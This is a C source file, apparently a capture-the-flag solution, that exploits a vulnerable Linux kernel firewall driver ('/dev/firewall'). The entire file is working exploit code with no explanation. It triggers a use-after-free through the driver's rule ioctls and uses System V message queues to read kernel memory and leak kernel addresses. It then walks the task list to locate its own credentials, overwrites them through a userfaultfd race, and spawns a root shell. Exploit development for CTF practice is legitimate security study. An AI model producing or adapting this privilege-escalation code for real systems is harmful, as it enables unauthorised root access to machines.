#define _GNU_SOURCE
#include <inttypes.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>
#include <stdint.h>
#include <fcntl.h>
#include <sched.h>
#include <pthread.h>
#include <byteswap.h>
#include <poll.h>
#include <assert.h>
#include <time.h>
#include <signal.h>
#include <sys/wait.h>
#include <sys/syscall.h>
#include <sys/mman.h>
#include <sys/timerfd.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/socket.h>
#include <sys/reboot.h>
#include <sys/types.h>
#include <linux/userfaultfd.h>
#include <arpa/inet.h>
#include <sys/shm.h>
#include <sys/stat.h>
#include <sys/prctl.h>
#include <sys/ioctl.h>
#include <errno.h>

#define ADD_RULE 0x1337babe
#define DELETE_RULE 0xdeadbabe
#define EDIT_RULE 0x1337beef
#define SHOW_RULE 0xdeadbeef
#define DUP_RULE 0xbaad5aad

#define ERROR -1
#define SUCCESS 0
#define MAX_RULES 0x80

#define INVALIDATE 1
#define VALIDATE 0

#define OFFSET_NAME 0x550
#define OFFSET_TASK 0x2a0
#define OFFSET_CRED 0x540

#define INBOUND 0
#define OUTBOUND 1
#define SKIP -1

#ifdef EASY_MODE
#define DESC_MAX 0x800
#endif

typedef struct
{
    char iface[16];
    char name[16];
    char ip[16];
    char netmask[16];
    uint8_t idx;
    uint8_t type;
    uint16_t proto;
    uint16_t port;
    uint8_t action;
    #ifdef EASY_MODE
    char desc[DESC_MAX];
    #endif
} user_rule_t;

int fd = 0, qid = 0, ret;
static int page_size = 0x1000;
unsigned long kernel_leak = 0, cred = 0;
char buf[0x2000];
pthread_t thr;

void hexprint(char *buffer, unsigned int bytes) // print like gdb qwords, we round to nearest dqword
{
    int dqwords = ((bytes + 0x10 - 1)&0xfffffff0) / 0x10;
    int qwords = dqwords * 2;
    for (int i = 0; i < qwords; i+=2)
    {
        printf("0x%04llx: 0x%016llx 0x%016llx\n", (i * 0x8), ((size_t*)buffer)[i], ((size_t*)buffer)[i+1]);
    }
    puts("-----------------------------------------------");
    return;
}

void gen_dot_notation(char *buf, uint32_t val)
{
    sprintf(buf, "%d.%d.%d.%d", val & 0xff, (val & 0xff00) >> 8, (val & 0xff0000) >> 16, (val & 0xff000000) >> 24);
    return;
}

void generate(char *input, user_rule_t *req)
{
    char addr[0x10];
    uint32_t ip = *(uint32_t *)&input[0x20];        // remain improved
    uint32_t netmask = *(int32_t *)&input[0x24];

    memset(addr, 0, sizeof(addr));
    gen_dot_notation(addr, ip);
    memcpy((void *)req->ip, addr, 0x10);

    memset(addr, 0, sizeof(addr));
    gen_dot_notation(addr, netmask);
    memcpy((void *)req->netmask, addr, 0x10);

    memcpy((void*)req->iface, input, 0x10);
    memcpy((void*)req->name,  (void *)&input[0x10], 0x10);
    memcpy((void*)&req->proto, (void *)&input[0x28], 0x2);
    memcpy((void*)&req->port,  (void *)&input[0x28+2], 0x2);
    memcpy((void*)&req->action,(void *)&input[0x28+4], 0x1);
}

void add(uint8_t idx, char *buffer, int type)
{
    user_rule_t rule;
    memset((void *)&rule, 0, sizeof(user_rule_t));
    generate(buffer, &rule);
    rule.idx = idx;
    rule.type = type;
    ioctl(fd, ADD_RULE, &rule);
}

void delete(uint8_t idx, int type)
{
    user_rule_t rule;
    memset((void *)&rule, 0, sizeof(user_rule_t));
    rule.idx = idx;
    rule.type = type;
    ioctl(fd, DELETE_RULE, &rule);
}

void edit(uint8_t idx, char *buffer, int type, int invalidate)
{
    user_rule_t rule;
    memset((void *)&rule, 0, sizeof(user_rule_t));
    generate(buffer, &rule);
    rule.idx = idx;
    rule.type = type;
    if (invalidate)
    {
        strcpy((void *)&rule.ip, "invalid");
        strcpy((void *)&rule.netmask, "invalid");
    }
    ioctl(fd, EDIT_RULE, &rule);
}

void duplicate(uint8_t idx, int type)
{
    user_rule_t rule;
    memset((void *)&rule, 0, sizeof(user_rule_t));
    rule.idx = idx;
    rule.type = type;
    ioctl(fd, DUP_RULE, &rule);
}

void errExit(char* msg1)
{
  puts(msg1);
  exit(-1);
}

void bp(char *p)
{
	char a;
	printf("Breakpoint: %s\n", p);
	read(0, &a, 1);
	return;
}

unsigned long check_task(unsigned long addr)
{
	memset(buf, 0x61, 0x10);
	memset(buf + 0x10, 0x42, 8);
	*(unsigned long *)(buf + 0x18) = 0x1000 - 0x30 + 0x1000 - 0x10;
	*(unsigned long *)(buf + 0x20) = addr - 8;
	edit(0, buf, INBOUND, VALIDATE);

	memset(buf, 0, 0x2000);
	ret = msgrcv(qid, buf, 0x1000 - 0x30 + 0x1000 - 0x10, 0, IPC_NOWAIT | MSG_COPY | MSG_NOERROR);
	assert(ret > 0);

	char * curr_name = buf + 0x1000 - 0x28 + OFFSET_NAME;
	printf("current_task 0x%lx, name: %s\n", addr, curr_name);

	if (!strcmp("speedrunner", curr_name))
		return 1;
	return 0;
}

static void * fault_handler_thread(void *arg)
{
   struct uffd_msg msg;   /* Data read from userfaultfd */
   static int fault_cnt = 0;     /* Number of faults so far handled */
   long uffd;                    /* userfaultfd file descriptor */
   static char *page = NULL;
   struct uffdio_copy uffdio_copy;
   ssize_t nread;

   uffd = (long) arg;

   /* Create a page that will be copied into the faulting region. */
   if (page == NULL) {
       page = mmap(NULL, page_size, PROT_READ | PROT_WRITE,
                   MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
       if (page == MAP_FAILED)
           errExit("mmap");
   }

   /* Loop, handling incoming events on the userfaultfd
      file descriptor. */
   for (;;) {

       /* See what poll() tells us about the userfaultfd. */
       struct pollfd pollfd;
       int nready;
       pollfd.fd = uffd;
       pollfd.events = POLLIN;
       nready = poll(&pollfd, 1, -1);
       if (nready == -1)
           errExit("poll");

       // printf("\nfault_handler_thread():\n");
       // printf("    poll() returns: nready = %d; "
       //         "POLLIN = %d; POLLERR = %d\n", nready,
       //         (pollfd.revents & POLLIN) != 0,
       //         (pollfd.revents & POLLERR) != 0);

       /* Read an event from the userfaultfd. */
       nread = read(uffd, &msg, sizeof(msg));
       if (nread == 0) {
           printf("EOF on userfaultfd!\n");
           exit(EXIT_FAILURE);
       }

       if (nread == -1)		errExit("read");

       /* We expect only one kind of event; verify that assumption. */
       if (msg.event != UFFD_EVENT_PAGEFAULT) {
           fprintf(stderr, "Unexpected event on userfaultfd\n");
           exit(EXIT_FAILURE);
       }

       /* Display info about the page-fault event. */
       // printf("    UFFD_EVENT_PAGEFAULT event: ");
       // printf("flags = %"PRIx64"; ", msg.arg.pagefault.flags);
       // printf("address = %"PRIx64"\n", msg.arg.pagefault.address);
       
       // Do the thing...
       memset(buf, 0x61, 0x10);
	   memset(buf + 0x10, 0x42, 8);
	   *(unsigned long *)(buf + 0x18) = 0x1000 - 0x30 + 0x30;
	   *(unsigned long *)(buf + 0x20) = cred - 8;
	   memset(buf + 0x28, 0, 0x40);
	   edit(1, buf, INBOUND, VALIDATE);

       uffdio_copy.src = (unsigned long) page;

       /* We need to handle page faults in units of pages(!).
          So, round faulting address down to page boundary. */
       uffdio_copy.dst = (unsigned long) msg.arg.pagefault.address &
                                          ~(page_size - 1);
       uffdio_copy.len = page_size;
       uffdio_copy.mode = 0;
       uffdio_copy.copy = 0;
       if (ioctl(uffd, UFFDIO_COPY, &uffdio_copy) == -1)
           errExit("ioctl-UFFDIO_COPY");

       // printf("        (uffdio_copy.copy returned %"PRId64")\n",
       //         uffdio_copy.copy);
       sleep(100000);
   }
}

void * register_userfaultfd()
{
	long uffd;          /* userfaultfd file descriptor */
	char *addr;         /* Start of region handled by userfaultfd */
	uint64_t len;       /* Length of region handled by userfaultfd */
	struct uffdio_api uffdio_api;
	struct uffdio_register uffdio_register;
	int s;

	len = page_size;

	/* Create and enable userfaultfd object. */
	uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
	if (uffd == -1)
	   errExit("userfaultfd");

	uffdio_api.api = UFFD_API;
	uffdio_api.features = 0;
	if (ioctl(uffd, UFFDIO_API, &uffdio_api) == -1)
	   errExit("ioctl-UFFDIO_API");

	/* Create a private anonymous mapping. The memory will be
	  demand-zero paged--that is, not yet allocated. When we
	  actually touch the memory, it will be allocated via
	  the userfaultfd. */
	addr = mmap(NULL, len, PROT_READ | PROT_WRITE,
	           MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	if (addr == MAP_FAILED)
	   errExit("mmap");

	// printf("Address returned by mmap() = %p\n", addr);

	/* Register the memory range of the mapping we just created for
	  handling by the userfaultfd object. In mode, we request to track
	  missing pages (i.e., pages that have not yet been faulted in). */
	uffdio_register.range.start = (unsigned long) addr;
	uffdio_register.range.len = len;
	uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;
	if (ioctl(uffd, UFFDIO_REGISTER, &uffdio_register) == -1)
	   errExit("ioctl-UFFDIO_REGISTER");

	/* Create a thread that will process the userfaultfd events. */
	s = pthread_create(&thr, NULL, fault_handler_thread, (void *) uffd);
	if (s != 0) {
	   errno = s;
	   errExit("pthread_create");
	}

	return addr;
}

int main()
{
	fd = open("/dev/firewall", O_RDONLY);
	if (fd <= 0)	exit(puts("ERROR in open()"));

	qid = msgget(IPC_PRIVATE, IPC_CREAT | 0666);	

	memset(buf, 0x41, 0x1000);
	add(0, buf, INBOUND);
	duplicate(0, INBOUND);
	delete(0, OUTBOUND);

	memset(buf, 0x42, 0x1000);
	assert(msgsnd(qid, buf, 0x1000 - 0x30 + 0x10, IPC_NOWAIT) != -1);
	for(int i=0; i<0x20; i++)
	{
		int shmid = shmget(IPC_PRIVATE, 0x1000, IPC_CREAT | IPC_EXCL | S_IRUSR | S_IWUSR);
		shmat(shmid, NULL, 0);
	}

	memset(buf, 0x61, 0x10);
	memset(buf + 0x10, 0x42, 8);
	*(unsigned long *)(buf + 0x18) = 0x1d00;
	edit(0, buf, INBOUND, INVALIDATE);

	memset(buf, 0, 0x2000);
	ret = msgrcv(qid, buf, 0x1d00, 0, IPC_NOWAIT | MSG_COPY | MSG_NOERROR);

	char* ptr = buf + 0x1000 - 0x8;
	while(ptr < buf + 0x2000)
	{
		if ((*(unsigned long *)(ptr + 0x00) & 0xfff) == 0x7a0 &&
			(*(unsigned long *)(ptr + 0x10) & 0xfff) == 0x0e0)
		{
			kernel_leak = *(unsigned long *)ptr;
			break;
		}
		ptr += 0x20;
	}
	if (!kernel_leak)	errExit("Couldn't find leaks...");

	prctl(PR_SET_NAME, "speedrunner");
	unsigned long init_task = kernel_leak - 0xffffffffb223d7a0 + 0xffffffffb22124c0;
	printf("kernel_leak: 0x%lx\n", kernel_leak);
	printf("init_task: 0x%lx\n", init_task);

	unsigned long INIT_TASK = init_task;
	unsigned long curr_task = INIT_TASK;

	for(int i=0; i<0x40; i++)
	{
		ret = check_task(curr_task);
		if (ret)
		{
			cred = *(unsigned long *)(buf + 0x1000 - 0x28 + OFFSET_CRED);
			cred |= 1;
			break;
		}
		curr_task = *(unsigned long *)(buf + 0x1000 - 0x28 + OFFSET_TASK) - OFFSET_TASK + 8;
	}
	cred--;
	printf("cred: 0x%lx\n", cred);

	memset(buf, 0x41, 0x1000);
	add(1, buf, INBOUND);
	add(2, buf, INBOUND);
	add(3, buf, INBOUND);
	add(4, buf, INBOUND);
	duplicate(1, INBOUND);
	delete(0, OUTBOUND);

	memset(buf, 0x42, 0x1000);
	char * addr = (long *)register_userfaultfd();
	mmap(addr - 0x1000, page_size, PROT_READ | PROT_WRITE,
	           MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);

	memset(addr-8, 0x42, 8);
	assert(msgsnd(qid, addr-8, 0x1000 - 0x30 + 0x30, IPC_NOWAIT) != -1);

	puts("[+]root shell for leet hacker...");
	system("/bin/sh");

	return 0;
}